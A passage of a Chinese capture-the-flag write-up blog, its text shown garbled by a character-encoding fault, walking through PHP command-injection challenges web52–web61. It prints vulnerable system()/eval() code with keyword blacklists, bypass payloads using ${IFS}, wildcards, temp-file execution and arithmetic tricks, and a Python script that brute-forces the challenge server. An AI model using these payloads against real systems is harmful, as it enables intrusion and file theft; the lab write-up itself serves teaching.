|[0-9]|\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c.<span class="string">&quot; &gt;/dev/null 2&gt;&amp;1&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ËøáÊª§‰∫ÜÂ∞ñÊã¨Âè∑Ôºå‰ΩÜÊîæÁ©∫‰∫Ü<code>$</code>Á¨¶ÁªôÊàë‰ª¨ÔºåÊâÄ‰ª•payloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;ta\c$&#123;IFS&#125;fla\g.php||</span><br></pre></td></tr></table></figure><p>‰ΩÜemmmÔºåÂ•ΩÂÉèflagÊîπÂú∞Êñπ‰∫Ü<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web52/NREZX%5B2B1Q8ODJ%6060%28O_OSO.png" alt=""><br>Áî®lsÊâæ‰∏Ä‰∏ãÔºåÂèëÁé∞Âú®Ê†πÁõÆÂΩï<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web52/%5DGLTIXCV%7BG9W9%5D8%28C90%60L4E.png" alt=""><br>ÊâÄ‰ª•ÁúüÊ≠£payloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;ta\c$&#123;IFS&#125;..&#x2F;..&#x2F;..&#x2F;fla?||</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web52/%60PF%7B%24%24EPXTDI%255AV%40H%5BKA6F.png" alt=""></p><h3 id="web53"><a class="header-anchor" href="#web53">¬∂</a>web53</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|cat|flag| |[0-9]|\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        <span class="keyword">echo</span>($c);</span><br><span class="line">        $d = system($c);</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;br&gt;&quot;</span>.$d;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°Â•ΩÂÉèÂè™ÊääÂêéÈù¢ÁöÑÂêûÂõûÊòæÁªôÂéªÊéâ‰∫ÜÔºåÈÇ£Êàë‰ª¨ÂéªÊéâÂêéÈù¢ÁöÑ<code>||</code>Âç≥ÂèØÔºåpayloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;ta\c$&#123;IFS&#125;fla?.php</span><br></pre></td></tr></table></figure><h3 id="web54"><a class="header-anchor" href="#web54">¬∂</a>web54</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| |[0-9]|\*|.*m.*o.*r.*e.*|.*w.*g.*e.*t.*|.*l.*e.*s.*s.*|.*h.*e.*a.*d.*|.*s.*o.*r.*t.*|.*t.*a.*i.*l.*|.*s.*e.*d.*|.*c.*u.*t.*|.*t.*a.*c.*|.*a.*w.*k.*|.*s.*t.*r.*i.*n.*g.*s.*|.*o.*d.*|.*c.*u.*r.*l.*|.*n.*l.*|.*s.*c.*p.*|.*r.*m.*|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ËøáÊª§‰∫ÜÂ•ΩÂ§öÂ≠óÊØçÔºå‰πü‰∏çËÉΩ‰ºöÁî®<code>\</code>ÁöÑÂΩ¢ÂºèËøõË°åÂàÜÂâ≤Ôºå‰ΩÜËøòÊúâÂè¶‰∏Ä‰∏™ËØªÂèñÁöÑÂëΩ‰ª§grepÂèØ‰ª•‰ΩøÁî®</p><blockquote><p>grep flag flag.php Êü•Êâæflag.phpÊñá‰ª∂‰∏≠Âê´ÊúâflagÁöÑÈÇ£‰∏ÄË°åÔºåÂπ∂‰∏îÊâìÂç∞Âá∫Êù•</p></blockquote><p>ÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•ÊûÑÈÄ†payloadÂ¶Ç‰∏ãÔºåÂú®flag.php‰∏≠Êü•ÊâæÂ∏¶ÊúâshowÂ≠óÁ¨¶‰∏≤ÁöÑ‰∏ÄË°å(Âõ†‰∏∫flagÁöÑÊ†ºÂºè‰∏∫ctfshow{})</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;grep$&#123;IFS&#125;show$&#123;IFS&#125;fl?g.php</span><br></pre></td></tr></table></figure><h3 id="web55"><a class="header-anchor" href="#web55">¬∂</a>web55</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°ÊääÂ≠óÊØçÈÉΩÁªôÁ¶ÅÊéâ‰∫ÜÔºå‰∏ÄËà¨ÈÅáÂà∞ËøôÊÉÖÂÜµÊúÄÂÆπÊòìÊÉ≥Âà∞ÁöÑÂ∫îËØ•ÊòØËøõË°åÂºÇÊàñËøêÁÆóÁ≠âÁ≠âÂäûÊ≥ïËøõË°åÊûÑÈÄ†ÔºåÂú®ËøôÈáå‰ªñÊ≤°ÊúâÁ¶ÅÊéâÊï∞Â≠óÔºåÊàë‰ª¨ÊúâÂÖ∂‰ªñÁï•ÂæÆÊñπ‰æøÁÇπÁöÑÊñπÊ≥ïÔºåÂ∞±ÊòØÈÄöËøáÂåπÈÖçbin‰∏ãÂ≠òÂú®ÁöÑÂëΩ‰ª§ËøõË°åËØªÂèñflag</p><blockquote><p>bin‰∏∫binaryÁöÑÁÆÄÂÜôÔºå‰∏ªË¶ÅÊîæÁΩÆ‰∏Ä‰∫õÁ≥ªÁªüÁöÑÂøÖÂ§áÊâßË°åÊ°£‰æãÂ¶Ç:cat„ÄÅcp„ÄÅchmod df„ÄÅdmesg„ÄÅgzip„ÄÅkill„ÄÅls„ÄÅmkdir„ÄÅmore„ÄÅmount„ÄÅrm„ÄÅsu„ÄÅtar„ÄÅbase64Á≠â„ÄÇ<br>Êàë‰ª¨Êó•Â∏∏Áõ¥Êé•‰ΩøÁî®ÁöÑcatÊàñËÄÖlsÁ≠âÁ≠âÈÉΩÂÖ∂ÂÆûÊòØÁÆÄÂÜôÔºå‰æãÂ¶ÇlsÂÆåÊï¥ÂÖ®Áß∞Â∫îËØ•ÊòØ/bin/ls</p></blockquote><p>ËøôÈáåÊ≤°ÊúâÁ¶ÅÁî®Êï∞Â≠óÊâÄ‰ª•Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®base64ÂëΩ‰ª§ÔºåÊûÑÈÄ†Â¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;&#x2F;???&#x2F;????64 ????.???                     ‰πüÂ∞±ÊòØ?c&#x3D;&#x2F;bin&#x2F;base64 flag.php</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web55/2L8OFD%28V3OTMN%7D~I6%29H%24NA9.png" alt=""><br>ÂÜçËøõË°åËß£Á†ÅÂç≥ÂèØÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web55/PQE%7BW3WHX3_%40_%24ONV%7D7C%4032.png" alt=""></p><h3 id="web56"><a class="header-anchor" href="#web56">¬∂</a>web56</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\\$|\(|\&#123;|\&#x27;|\&quot;|\`|\%|\x09|\x26|\&gt;|\&lt;/i&quot;</span>, $c))&#123;</span><br><span class="line">        system($c);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÊ¨°Âú®‰∏ä‰∏ÄÈ¢òÁöÑÂü∫Á°Ä‰∏äÂ§öËøáÊª§Êéâ‰∫ÜÊï∞Â≠óÔºåÂØºËá¥Êàë‰ª¨Êó†Ê≥ï‰ΩøÁî®‰∏äÈ¢òÁöÑpayload„ÄÇ‰∏çËøá‰πãÂâçÁúãËøápÂ∏àÂÇÖÁöÑ‰∏ÄÁØáÊó†Â≠óÊØçÊï∞Â≠ówebshellÁöÑÊñáÁ´†ÔºåËøôÈáåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®phpÁöÑÁâπÊÄßÔºöÂ¶ÇÊûúÊàë‰ª¨ÂèëÈÄÅ‰∏Ä‰∏™‰∏ä‰º†Êñá‰ª∂ÁöÑpostÂåÖÔºåphp‰ºöÂ∞ÜÊàë‰ª¨‰∏ä‰º†ÁöÑÊñá‰ª∂‰øùÂ≠òÂú®‰∏¥Êó∂ÁöÑÊñá‰ª∂Â§π‰∏ãÔºåÂπ∂‰∏îÈªòËÆ§ÁöÑÊñá‰ª∂ÁõÆÂΩïÊòØ/tmp/phpxxxxxx„ÄÇÊñá‰ª∂ÂêçÊúÄÂêéÁöÑ6‰∏™Â≠óÁ¨¶ÊòØÈöèÊú∫ÁöÑÂ§ßÂ∞èÂÜôÂ≠óÊØçÔºåËÄå‰∏îÊúÄÂêé‰∏Ä‰∏™Â≠óÁ¨¶Â§ßÊ¶ÇÁéáÊòØÂ§ßÂÜôÂ≠óÊØç„ÄÇÂÆπÊòìÊÉ≥Âà∞ÁöÑÂåπÈÖçÊñπÂºèÂ∞±ÊòØÂà©Áî®<code>Ôºü</code>ËøõË°åÂåπÈÖçÔºåÂç≥<code>???/?????????</code>ÔºåÁÑ∂ËÄåËøô‰∏ç‰∏ÄÂÆö‰ºöÂåπÈÖçÂà∞Êàë‰ª¨‰∏ä‰º†ÁöÑÊñá‰ª∂ÔºåËøôÊó∂ÂÄôÊúâ‰ªÄ‰πàÂäûÊ≥ïÂë¢Ôºü<br>Âú®asciiÁ†ÅË°®‰∏≠ËßÇÂØüÂèëÁé∞<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web56/0IFRV0PPH991LC%25HL%6088%24US.png" alt=""><br>Âú®Â§ßÂÜôÂ≠óÊØçAÁöÑÂâç‰∏Ä‰∏™Á¨¶Âè∑‰∏∫<code>@</code>ÔºåÂ§ßÂÜôÂ≠óÊØçZÁöÑÂêé‰∏Ä‰∏™Â≠óÊØç‰∏∫<code>[</code>ÔºåÂõ†Ê≠§Êàë‰ª¨ÂèØ‰ª•‰ΩøÁî®<code>[@-[]</code>Êù•Ë°®Á§∫ÂåπÈÖçÂ§ßÂÜôÂ≠óÊØçÔºå‰πüÂ∞±ÊòØÂèòÊàê‰∫ÜËøôÊ†∑ÁöÑÂΩ¢ÂºèÔºö<code>???/????????[@-[]</code>ÔºåÂà∞Ëøô‰∏ÄÊ≠•Â∑≤ÁªèËÉΩÂåπÈÖçÂà∞‰∫ÜÊàë‰ª¨‰∏ä‰º†ÁöÑÊñá‰ª∂ÔºåÈÇ£ÈôêÂà∂‰∫ÜÂ≠óÊØçÂêéËØ•Â¶Ç‰ΩïÊâßË°å‰∏ä‰º†ÁöÑÊñá‰ª∂Âë¢ÔºüËøôÈáåÊúâ‰∏™ÊäÄÂ∑ßÔºåÂ∞±ÊòØ‰ΩøÁî®<code>. file</code>Êù•ÊâßË°åÊñá‰ª∂ÔºåÊàë‰ª¨ÂèØ‰ª•ÂéªÊìç‰ΩúÁúãÁúã<br>Âú®ÁõÆÂΩï‰∏ãÊñ∞Âª∫‰∏Ä‰∏™f.txtÔºåÂÜÖÂÆπ‰∏∫lsÔºåÊàë‰ª¨‰ΩøÁî®<code>. /home/kali/ctf_tools/a/f.txt</code>Êù•ÊâßË°åÊñá‰ª∂<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web56/LKNQQ5IM_3AI%7B1LH%2420J42O.png" alt=""><br>ÂèëÁé∞f.txtÈáåÁöÑlsÂëΩ‰ª§Ë¢´ÊàêÂäüÊâßË°åÔºåÊâÄ‰ª•Êàë‰ª¨ÁöÑÂÆåÊï¥payloadÂ∞±ÊòØ</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;. &#x2F;???&#x2F;????????[@-[]</span><br><span class="line">Âπ∂‰∏îÂêåÊó∂‰∏ä‰º†Êàë‰ª¨ÁöÑÊñá‰ª∂ÔºåÊñá‰ª∂ÂÜÖÂÆπÈáåÈù¢ÊòØÂëΩ‰ª§</span><br></pre></td></tr></table></figure><p>ËøôÈáåÊàë‰ª¨ÂÜô‰∏™ËÑöÊú¨</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#-- coding:UTF-8 --</span></span><br><span class="line"><span class="comment"># Author:dota_st</span></span><br><span class="line"><span class="comment"># Date:2021/2/11 9:14</span></span><br><span class="line"><span class="comment"># blog: www.wlhhlc.top</span></span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    url = <span class="string">&quot;http://92a3d8ba-280b-4cb8-bd47-58b577bb6204.chall.ctf.show:8080/?c=. /???/????????[@-[]&quot;</span></span><br><span class="line"></span><br><span class="line">    r = requests.post(url, files=&#123;<span class="string">&quot;file&quot;</span>: (<span class="string">&quot;dota.txt&quot;</span>, <span class="string">&quot;cat flag.php&quot;</span>)&#125;)</span><br><span class="line">    flag = r.text.split(<span class="string">&#x27;ctfshow&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> len(flag) &gt;<span class="number">1</span>:</span><br><span class="line">        print(r.text)</span><br><span class="line">        <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>ËøêË°åÂÆåÂêéÊàêÂäüËé∑ÂèñÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web56/J36~B%25PUX3GF%7DVQASGO%5BDYX.png" alt=""></p><h3 id="web57"><a class="header-anchor" href="#web57">¬∂</a>web57</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//flag in 36.php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">    $c=$_GET[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(!preg_match(<span class="string">&quot;/\;|[a-z]|[0-9]|\`|\|\#|\&#x27;|\&quot;|\`|\%|\x09|\x26|\x0a|\&gt;|\&lt;|\.|\,|\?|\*|\-|\=|\[/i&quot;</span>, $c))&#123;</span><br><span class="line">        system(<span class="string">&quot;cat &quot;</span>.$c.<span class="string">&quot;.php&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ËøôÈ¢ò‰∏ç‰ªÖËøáÊª§‰∫ÜÂ≠óÊØçÊï∞Â≠óÔºåËøòÊääÈÄöÈÖçÁ¨¶ÈÉΩÁªôËøáÊª§‰∫Ü„ÄÇÊü•‰∫Ü‰∏Ä‰∏ãËµÑÊñôÔºåÂèëÁé∞Âú®shell‰∏≠ÂèØ‰ª•Âà©Áî®<code>$</code>Âíå<code>()</code>ËøõË°åÊûÑÈÄ†Êï∞Â≠óÔºåËÄåËøôÈÅìÈ¢òÊèêÁ§∫flagÂú®36.php‰∏≠Ôºåsystem‰∏≠Â∑≤ÁªèÂÜôÂ•ΩcatÂíåphpÔºåÊâÄ‰ª•Êàë‰ª¨Âè™ÈúÄË¶ÅÊûÑÈÄ†Âá∫36Âç≥ÂèØ</p><blockquote><p><code>$(())</code> ‰ª£Ë°®ÂÅö‰∏ÄÊ¨°ËøêÁÆóÔºåÂõ†‰∏∫ÈáåÈù¢‰∏∫Á©∫Ôºå‰πüË°®Á§∫ÂÄº‰∏∫0<br><code>$((~$(())))</code> ÂØπ0‰ΩúÂèñÂèçËøêÁÆóÔºåÂÄº‰∏∫-1<br><code>$(($((~$(())))$((~$(())))))</code> -1-1Ôºå‰πüÂ∞±ÊòØ(-1)+(-1)‰∏∫-2ÔºåÊâÄ‰ª•ÂÄº‰∏∫-2<br><code>$((~$(($((~$(())))$((~$(())))))))</code> ÂÜçÂØπ-2ÂÅö‰∏ÄÊ¨°ÂèñÂèçÂæóÂà∞1ÔºåÊâÄ‰ª•ÂÄº‰∏∫1</p><p>Â¶ÇÊûúÂØπÂèñÂèç‰∏ç‰∫ÜËß£ÂèØ‰ª•ÁôæÂ∫¶‰∏Ä‰∏ãÔºåËøôÈáåÁªô‰∏™ÂÆπÊòìËÆ∞ÂæóÂºèÂ≠êÔºåÂ¶ÇÊûúÂØπaÊåâ‰ΩçÂèñÂèçÔºåÂàôÂæóÂà∞ÁöÑÁªìÊûú‰∏∫-(a+1)Ôºå‰πüÂ∞±ÊòØÂØπ0ÂèñÂèçÂæóÂà∞-1</p></blockquote><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web57/CHH1%24IQ%40EBHL5L%2877%5B%40%251OP.png" alt=""><br>ÊâÄ‰ª•Êàë‰ª¨Âè™Ë¶ÅÊûÑÈÄ†Âá∫-37ÔºåÂÜçËøõË°åÂèñÂèçÔºåÂç≥ÂèØÂæóÂà∞Êàë‰ª¨ÊÉ≥Ë¶ÅÁöÑÊï∞Â≠ó36<br>ÂÜô‰∏Ä‰∏™ËÑöÊú¨ËøõË°åÊûÑÈÄ†</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">data = <span class="string">&quot;$((~$((&quot;</span>+<span class="string">&quot;$((~$(())))&quot;</span>*<span class="number">37</span>+<span class="string">&quot;))))&quot;</span></span><br><span class="line">print(data)</span><br></pre></td></tr></table></figure><p>payloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?c&#x3D;$((~$(($((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))$((~$(())))))))</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web57/%5BYB%29%7D%5BYR3LS3%60MH~%60XVE0P4.png" alt=""><br>Âõ†‰∏∫ÊòØcatÂëΩ‰ª§ÔºåÊâÄ‰ª•Âè≥ÈîÆÊü•Áúã‰∏Ä‰∏ãÊ∫êÁ†ÅÂç≥ÂèØÂæóÂà∞flag<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web57/%7DYV1%40J%28Y9HCI3OUEMBT0%5B17.png" alt=""></p><h3 id="web58"><a class="header-anchor" href="#web58">¬∂</a>web58</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ‰Ω†‰ª¨Âú®ÁÇ´ÊäÄÂêóÔºü</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>È¢ùÔºåÁ™ÅÁÑ∂ÂèòÁÆÄÂçï‰∫ÜÔºåËøôÈáåÂèØ‰ª•Áõ¥Êé•ËöÅÂâëËøûÊé•ËøõÂéªÊü•Áúãflag‰∫Ü(ÂêéÈù¢ÂÖ∂ÂÆûÈÉΩÂèØ‰ª•‰ΩøÁî®ËöÅÂâëÁõ¥Êé•ËøûÊé•getshell)<br><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web58/B4A4VP%5BNJ%40B61F6R%407Z%604RY.png" alt=""><br>‰∏çËøáÂ∫îËØ•ÊòØËÄÉËØªÂèñÊñá‰ª∂ÁöÑÔºåÊàë‰ª¨‰ΩøÁî®ËØªÂèñÊñá‰ª∂ÂáΩÊï∞ËøõË°åËØªÂèñflagÔºåpayloadÂ¶Ç‰∏ã</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><p><img src="https://blog-file-1302856486.file.myqcloud.com/Web1000%28%E4%B8%80%29/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/web58/W%25%29%7B%5BN%60~%40APWG58M5%603I6_2.png" alt=""><br>ËøôÈáåË°•ÂÖÖ‰∏Ä‰∫õËØªÂèñÊñá‰ª∂ÂáΩÊï∞ÁöÑÁî®Ê≥ï</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">highlight_file($filename);</span><br><span class="line">show_source($filename);</span><br><span class="line">print_r(php_strip_whitespace($filename));</span><br><span class="line">print_r(file_get_contents($filename));</span><br><span class="line">readfile($filename);</span><br><span class="line">print_r(file($filename)); <span class="comment">// var_dump</span></span><br><span class="line">fread(fopen($filename,<span class="string">&quot;r&quot;</span>), $size);</span><br><span class="line"><span class="keyword">include</span>($filename); <span class="comment">// Èùûphp‰ª£Á†Å</span></span><br><span class="line"><span class="keyword">include_once</span>($filename); <span class="comment">// Èùûphp‰ª£Á†Å</span></span><br><span class="line"><span class="keyword">require</span>($filename); <span class="comment">// Èùûphp‰ª£Á†Å</span></span><br><span class="line"><span class="keyword">require_once</span>($filename); <span class="comment">// Èùûphp‰ª£Á†Å</span></span><br><span class="line">print_r(fread(popen(<span class="string">&quot;cat flag&quot;</span>, <span class="string">&quot;r&quot;</span>), $size));</span><br><span class="line">print_r(fgets(fopen($filename, <span class="string">&quot;r&quot;</span>))); <span class="comment">// ËØªÂèñ‰∏ÄË°å</span></span><br><span class="line">fpassthru(fopen($filename, <span class="string">&quot;r&quot;</span>)); <span class="comment">// ‰ªéÂΩìÂâç‰ΩçÁΩÆ‰∏ÄÁõ¥ËØªÂèñÂà∞ EOF</span></span><br><span class="line">print_r(fgetcsv(fopen($filename,<span class="string">&quot;r&quot;</span>), $size));</span><br><span class="line">print_r(fgetss(fopen($filename, <span class="string">&quot;r&quot;</span>))); <span class="comment">// ‰ªéÊñá‰ª∂ÊåáÈíà‰∏≠ËØªÂèñ‰∏ÄË°åÂπ∂ËøáÊª§Êéâ HTML Ê†áËÆ∞</span></span><br><span class="line">print_r(fscanf(fopen(<span class="string">&quot;flag&quot;</span>, <span class="string">&quot;r&quot;</span>),<span class="string">&quot;%s&quot;</span>));</span><br><span class="line">print_r(parse_ini_file($filename)); <span class="comment">// Â§±Ë¥•Êó∂ËøîÂõû false , ÊàêÂäüËøîÂõûÈÖçÁΩÆÊï∞ÁªÑ</span></span><br></pre></td></tr></table></figure><h3 id="web59"><a class="header-anchor" href="#web59">¬∂</a>web59</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// ‰Ω†‰ª¨Âú®ÁÇ´ÊäÄÂêóÔºü</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>‰ª£Á†ÅÊ≤°ÂèòÔºåÂ∫îËØ•ÊòØÂºÄÂßãÁ¶ÅÁî®‰∫Ü‰∏Ä‰∫õÂáΩÊï∞ÔºåËÄÉÁÇπÂ∫îËØ•ÂºÄÂßãÊòØÁªïdisable_functions‰∫ÜÔºåshow_source()Ê≤°ÊúâË¢´Á¶ÅÔºåÁªßÁª≠‰ΩøÁî®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><h3 id="web60"><a class="header-anchor" href="#web60">¬∂</a>web60</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_POST[<span class="string">&#x27;c&#x27;</span>]))&#123;</span><br><span class="line">        $c= $_POST[<span class="string">&#x27;c&#x27;</span>];</span><br><span class="line">        <span class="keyword">eval</span>($c);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>show_source()Ê≤°ÊúâË¢´Á¶ÅÔºåÁªßÁª≠‰ΩøÁî®</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c&#x3D;show_source(&quot;flag.php&quot;);</span><br></pre></td></tr></table></figure><h3 id="web61"><a class="header-anchor" href="#web61">¬∂</a>web61</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td 